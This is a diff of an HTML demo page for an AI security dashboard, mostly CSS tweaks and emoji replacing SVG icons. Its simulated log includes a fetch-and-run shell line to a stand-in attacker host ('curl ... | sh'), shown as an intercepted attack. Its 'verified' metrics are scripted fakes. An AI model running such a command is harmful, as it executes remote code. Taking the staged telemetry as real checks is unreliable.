@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" />
   <title>Bartholomew | Enterprise AI Security Command Center</title>
   <meta name="description" content="Bartholomew Developer Console — Sub-microsecond CI repair telemetry, active OWASP LLM kill-switch enforcement, trajectory fuzzing, and autonomous PR dispatch.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -42,7 +42,7 @@
       font-size: var(--font-scale);
       min-height: 100vh; display: flex; flex-direction: column;
       overflow-x: hidden; width: 100%; max-width: 100vw;
-      -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
+      -webkit-text-size-adjust: 100%;
       transition: background 0.3s ease, color 0.3s ease;
     }
 
@@ -50,7 +50,7 @@
     header {
       position: sticky; top: 0; z-index: 200;
       background: rgba(3,11,24,0.95);
-      -webkit-backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
+      backdrop-filter: blur(18px); -webkit-backdrop-filter: blur(18px);
       border-bottom: 1px solid var(--border);
       width: 100%;
     }
@@ -103,7 +103,8 @@
     /* Scrollable Tab Strip */
     .tab-strip-wrap {
       max-width: 1400px; margin: 0 auto; width: 100%;
-      overflow-x: auto; }
+      overflow-x: auto; -webkit-overflow-scrolling: touch;
+    }
     .tab-strip-wrap::-webkit-scrollbar { display: none; }
     .tab-nav {
       display: flex; align-items: center; gap: 2px;
@@ -147,21 +148,14 @@
       display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 18px; align-items: center; width: 100%;
     }
     .btn {
-      display: inline-flex; align-items: center; gap: 7px; justify-content: center;
+      display: inline-flex; align-items: center; gap: 6px; justify-content: center;
       padding: 8px 16px; border-radius: 8px; font-size: 13px; font-weight: 600;
       cursor: pointer; min-height: 40px; border: 1px solid var(--border);
       background: rgba(255,255,255,0.05); color: var(--sub);
-      transition: all 0.2s; white-space: nowrap; text-decoration: none; -webkit-user-select: none;
-      user-select: none;
+      transition: all 0.2s; white-space: nowrap; text-decoration: none; user-select: none;
     }
     .btn:hover { background: rgba(255,255,255,0.1); color: #fff; border-color: rgba(255,255,255,0.15); }
     .btn:active { transform: scale(0.98); }
-    .btn-icon {
-      width: 15px; height: 15px; min-width: 15px; flex-shrink: 0;
-      stroke-width: 2.2; display: inline-block; vertical-align: middle;
-      transition: transform 0.2s ease;
-    }
-    .btn:hover .btn-icon { transform: scale(1.15); }
     .btn-cyan {
       background: linear-gradient(135deg, var(--cyan), var(--blue));
       color: #030b18 !important; border: none; font-weight: 700;
@@ -272,7 +266,7 @@
       padding: 12px 14px; font-family: 'JetBrains Mono', monospace;
       font-size: clamp(11px, 1.4vw, 12px); color: var(--sub);
       min-height: 220px; max-height: 300px; overflow-y: auto; line-height: 1.65;
-      word-break: break-word; background: rgba(2,6,14,0.6);
+      -webkit-overflow-scrolling: touch; word-break: break-word; background: rgba(2,6,14,0.6);
       border-radius: 8px; border: 1px solid rgba(255,255,255,0.04);
     }
     .f-line { margin-bottom: 5px; animation: lineIn 0.2s ease-out; }
@@ -296,7 +290,7 @@
 
     /* OWASP Matrix List */
     .owasp-list {
-      max-height: 380px; overflow-y: auto; width: 100%;
+      max-height: 380px; overflow-y: auto; -webkit-overflow-scrolling: touch; width: 100%;
     }
     .owasp-item {
       display: flex; align-items: center; gap: 10px;
@@ -317,7 +311,8 @@
       overflow: hidden; margin-bottom: 18px; width: 100%;
     }
     .table-scroll {
-      width: 100%; overflow-x: auto; }
+      width: 100%; overflow-x: auto; -webkit-overflow-scrolling: touch;
+    }
     table { width: 100%; border-collapse: collapse; min-width: 580px; font-size: 12.5px; }
     thead th {
       font-family: 'JetBrains Mono', monospace; font-size: 10.5px; color: var(--muted);
@@ -380,7 +375,7 @@
     /* Tour Modal */
     .tour-overlay {
       display: none; position: fixed; inset: 0; z-index: 500;
-      background: rgba(0,0,0,0.8); -webkit-backdrop-filter: blur(8px);
+      background: rgba(0,0,0,0.8); backdrop-filter: blur(8px);
       align-items: center; justify-content: center; padding: 16px;
     }
     .tour-overlay.open { display: flex; }
@@ -469,26 +464,11 @@
 
     <!-- LIVE ACTION BUTTONS -->
     <div class="control-bar">
-      <button class="btn btn-green" onclick="triggerSafeRun()">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>
-        <span>Safe Run</span>
-      </button>
-      <button class="btn btn-red" onclick="triggerHighRisk()">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-        <span>High-Risk Run</span>
-      </button>
-      <button class="btn btn-amber" onclick="triggerMultiStep()">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
-        <span>Multi-Step Escalation</span>
-      </button>
-      <button class="btn" onclick="triggerRedTeamScan()">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><circle cx="12" cy="12" r="10"/><line x1="22" y1="12" x2="18" y2="12"/><line x1="6" y1="12" x2="2" y2="12"/><line x1="12" y1="6" x2="12" y2="2"/><line x1="12" y1="22" x2="12" y2="18"/><circle cx="12" cy="12" r="3.5"/></svg>
-        <span>OWASP Red-Team Scan</span>
-      </button>
-      <button class="btn" onclick="clearConsole()">
-        <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor"><path d="M3 6h18"/><path d="M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6"/><path d="M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2"/><line x1="10" y1="11" x2="10" y2="17"/><line x1="14" y1="11" x2="14" y2="17"/></svg>
-        <span>Clear Console</span>
-      </button>
+      <button class="btn btn-green" onclick="triggerSafeRun()">🛡️ Safe Run</button>
+      <button class="btn btn-red" onclick="triggerHighRisk()">🛑 High-Risk Run</button>
+      <button class="btn btn-amber" onclick="triggerMultiStep()">⚡ Multi-Step Escalation</button>
+      <button class="btn" onclick="triggerRedTeamScan()">🔍 OWASP Red-Team Scan</button>
+      <button class="btn" onclick="clearConsole()">🧹 Clear Console</button>
       <div class="stream-pill"><div class="pulse-dot"></div>SSE Stream: ACTIVE</div>
     </div>
 
@@ -910,11 +890,11 @@
 
   /* ---- INTERACTIVE SIMULATION RUNS ---- */
   function triggerSafeRun() {
-    logTerminal(`[TRAJECTORY_START] <strong>Non-invasive query evaluation</strong> (PID: ${Math.floor(Math.random()*9000+1000)})`, 'f-hl');
+    logTerminal(`🛡️ <strong>[TRAJECTORY_START]</strong> Non-invasive query evaluation (PID: ${Math.floor(Math.random()*9000+1000)})`, 'f-hl');
     setTimeout(() => logTerminal(`[AST_VERIFY] Static taint analysis clean (0 sinks exposed)`, 'f-ok'), 150);
     setTimeout(() => logTerminal(`[SHA256_ATTEST] 9a83f7b82c... deterministic proof verified in 1.38 &mu;s`, 'f-ok'), 300);
     setTimeout(() => {
-      logTerminal(`[STATUS: SAFE] <strong>Trajectory dispatched without execution barrier.</strong>`, 'f-ok');
+      logTerminal(`✅ <strong>[STATUS: SAFE]</strong> Trajectory dispatched without execution barrier.`, 'f-ok');
       animateMetrics(1.12, 2.94);
       flashAnomalies([78, 52, 38, 71, 12, 22]);
       showToast('Safe Trajectory Dispatched (1.12 µs)');
@@ -922,11 +902,11 @@
   }
 
   function triggerHighRisk() {
-    logTerminal(`[ADVERSARIAL_INJECTION] <strong>High-risk pattern detected in prompt trajectory!</strong>`, 'f-warn');
+    logTerminal(`⚠️ <strong>[ADVERSARIAL_INJECTION]</strong> High-risk pattern detected in prompt trajectory!`, 'f-warn');
     setTimeout(() => logTerminal(`[TAINT_DETECT] Attempted shell escalation: <code>os.system("curl -s http://attacker.io | sh")</code>`, 'f-err'), 180);
-    setTimeout(() => logTerminal(`[OWASP_KILL_SWITCH] <strong>LLM02/LLM05 TRIGGERED &bull; Intercepted in 1.44 &mu;s</strong>`, 'f-err'), 350);
+    setTimeout(() => logTerminal(`🛑 <strong>[OWASP_KILL_SWITCH]</strong> LLM02/LLM05 TRIGGERED &bull; Intercepted in 1.44 &mu;s`, 'f-err'), 350);
     setTimeout(() => {
-      logTerminal(`[ROLLBACK_COMPLETE] <strong>Sandbox rolled back to clean state. Immutable audit attestation logged.</strong>`, 'f-hl');
+      logTerminal(`🔒 <strong>[ROLLBACK_COMPLETE]</strong> Sandbox rolled back to clean state. Immutable audit attestation logged.`, 'f-hl');
       animateMetrics(1.44, 3.82);
       flashAnomalies([92, 88, 76, 84, 89, 65], true);
       pulseOwaspItem(2);
@@ -936,12 +916,12 @@
   }
 
   function triggerMultiStep() {
-    logTerminal(`[MULTI_STEP_ESCALATION] <strong>Initializing 4-stage adversarial fuzz probe...</strong>`, 'f-hl');
+    logTerminal(`⚡ <strong>[MULTI_STEP_ESCALATION]</strong> Initializing 4-stage adversarial fuzz probe...`, 'f-hl');
     const stages = [
       { t: `[STAGE 1/4] Probing environment variables and memory bounds...`, c: 'f-line' },
       { t: `[STAGE 2/4] Detecting reflection bypass attempt &mdash; <strong>INTERCEPTED</strong>`, c: 'f-warn' },
       { t: `[STAGE 3/4] Fuzzing AST syntax tree mutations (240 permutations)...`, c: 'f-line' },
-      { t: `[STAGE 4/4] [VERIFIED] <strong>Zero leakage across all sandboxed trajectories.</strong>`, c: 'f-ok' }
+      { t: `[STAGE 4/4] ✅ <strong>[VERIFIED]</strong> Zero leakage across all sandboxed trajectories.`, c: 'f-ok' }
     ];
     stages.forEach((s, idx) => {
       setTimeout(() => logTerminal(s.t, s.c), (idx + 1) * 280);
@@ -951,7 +931,7 @@
 
   function triggerRedTeamScan() {
     showTab('owasp', document.querySelector('[onclick*=owasp]'));
-    logTerminal(`[RED_TEAM_AUDIT] <strong>Sweeping all 10 OWASP LLM risk categories...</strong>`, 'f-hl');
+    logTerminal(`🔍 <strong>[RED_TEAM_AUDIT]</strong> Sweeping all 10 OWASP LLM risk categories...`, 'f-hl');
     const items = document.querySelectorAll('.owasp-item');
     items.forEach((item, idx) => {
       setTimeout(() => {
@@ -963,7 +943,7 @@
       }, idx * 120);
     });
     setTimeout(() => {
-      logTerminal(`[AUDIT_PASS] <strong>10/10 OWASP protection rules verified active and operational.</strong>`, 'f-ok');
+      logTerminal(`✅ <strong>[AUDIT_PASS]</strong> 10/10 OWASP protection rules verified active and operational.`, 'f-ok');
       showToast('10/10 OWASP Protections Verified Active');
     }, 1400);
   }
